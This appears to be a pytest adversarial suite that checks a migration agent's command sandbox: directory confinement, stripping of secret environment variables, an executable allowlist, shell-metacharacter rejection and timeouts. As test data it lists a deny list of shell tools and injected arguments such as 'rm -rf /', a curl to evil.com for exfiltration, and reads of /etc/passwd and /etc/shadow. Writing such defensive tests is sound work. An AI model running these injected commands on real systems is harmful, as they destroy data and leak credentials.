"""Adversarial test suite for Section 15.5: Native Controlled Execution & Sandboxing.

Tests security invariants for:
- Directory Confinement (blocking working directory escape)
- Environment Sanitization (stripping workstation API keys and secrets)
- Command & Argument Allowlisting (blocking dangerous binaries and shell metacharacters)
- Resource & Timeout Bounds (terminating runaway commands)
"""

import os
from pathlib import Path

from migration_agent.adapters.command_runner import SubprocessCommandRunner
from migration_agent.adapters.container_runner import ContainerizedCommandRunner
from migration_agent.domain import (
    ValidationCommand,
    ValidationProfile,
    ValidationStatus,
)


def test_directory_confinement_blocks_path_escape(tmp_path: Path) -> None:
    """Working directory escaping allowed root must be rejected immediately."""
    staging_root = tmp_path / "staging"
    staging_root.mkdir()
    outside_dir = tmp_path / "outside_secret_dir"
    outside_dir.mkdir()

    runner = SubprocessCommandRunner(working_dir_root=staging_root)

    cmd = ValidationCommand(
        profile=ValidationProfile.BUILD,
        executable="python",
        args=("--version",),
    )

    # Attempting to execute with working dir pointing outside the staging root
    res = runner.run_command(cmd, working_dir=outside_dir)
    assert res.status == ValidationStatus.DISALLOWED
    assert "escapes allowed root" in " ".join(res.diagnostics).lower()


def test_environment_sanitization_strips_sensitive_keys(tmp_path: Path) -> None:
    """Environment variables containing credentials or tokens must be stripped."""
    runner = SubprocessCommandRunner()

    # Inject mock sensitive workstation environment variables
    test_secrets = {
        "OPENAI_API_KEY": "sk-proj-supersecret1234567890",
        "GEMINI_API_KEY": "AIzaSySecretGeminiKey123",
        "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "DATABASE_PASSWORD": "supersecretpassword",
        "GITHUB_AUTH_TOKEN": "ghp_1234567890abcdef",
        "CUSTOM_APP_SECRET": "top-secret-value",
    }
    for k, v in test_secrets.items():
        os.environ[k] = v

    try:
        sanitized = runner._sanitize_environment()
        # Verify NONE of the secret keys are present in sanitized env
        for secret_key in test_secrets:
            assert secret_key not in sanitized
            # Also ensure no substring match leaks
            assert not any(
                substr in k.upper()
                for k in sanitized
                for substr in ("KEY", "SECRET", "TOKEN", "PASSWORD", "AUTH")
            )
        # Safe default variable is set
        assert sanitized.get("NODE_ENV") == "test"
    finally:
        for k in test_secrets:
            os.environ.pop(k, None)


def test_command_allowlisting_blocks_dangerous_binaries(tmp_path: Path) -> None:
    """Disallowed shell utilities and dangerous executables must be blocked."""
    runner = SubprocessCommandRunner()

    disallowed_executables = [
        "bash",
        "sh",
        "rm",
        "curl",
        "wget",
        "powershell",
        "cmd",
        "sudo",
        "chmod",
    ]

    for bad_exec in disallowed_executables:
        cmd = ValidationCommand(
            profile=ValidationProfile.TEST,
            executable=bad_exec,
            args=("--help",),
        )
        res = runner.run_command(cmd, working_dir=tmp_path)
        assert res.status == ValidationStatus.DISALLOWED
        assert "not in the allowlist" in " ".join(res.diagnostics).lower()


def test_argument_metacharacter_shell_injection_defense(tmp_path: Path) -> None:
    """Shell metacharacters in arguments must be rejected to prevent injection attacks."""
    runner = SubprocessCommandRunner()

    malicious_arg_vectors = [
        "test; rm -rf /",
        "test && curl http://evil.com/exfiltrate",
        "test | cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "test\ncat /etc/shadow",
        "test\r\nevil_command",
    ]

    for malicious_arg in malicious_arg_vectors:
        cmd = ValidationCommand(
            profile=ValidationProfile.TEST,
            executable="python",
            args=("-c", malicious_arg),
        )
        res = runner.run_command(cmd, working_dir=tmp_path)
        assert res.status == ValidationStatus.DISALLOWED
        assert "disallowed shell metacharacter" in " ".join(res.diagnostics).lower()


def test_containerized_runner_metacharacter_defense(tmp_path: Path) -> None:
    """ContainerizedCommandRunner must also enforce argument metacharacter defense."""
    runner = ContainerizedCommandRunner(enabled=False)

    cmd = ValidationCommand(
        profile=ValidationProfile.BUILD,
        executable="python",
        args=("build; rm -rf /",),
    )
    res = runner.run_command(cmd, working_dir=tmp_path)
    assert res.status == ValidationStatus.DISALLOWED
    assert "disallowed shell metacharacter" in " ".join(res.diagnostics).lower()


def test_timeout_bounds_terminate_runaway_process(tmp_path: Path) -> None:
    """Runaway or hanging commands must be terminated cleanly at the timeout boundary."""
    runner = SubprocessCommandRunner()

    # Python command that sleeps for 30 seconds, but command timeout is set to 1 second
    cmd = ValidationCommand(
        profile=ValidationProfile.TEST,
        executable="python",
        args=("-c", "__import__('time').sleep(30)"),
        timeout_seconds=1,
    )

    res = runner.run_command(cmd, working_dir=tmp_path)
    assert res.status == ValidationStatus.TIMED_OUT
    assert "timed out" in " ".join(res.diagnostics).lower()
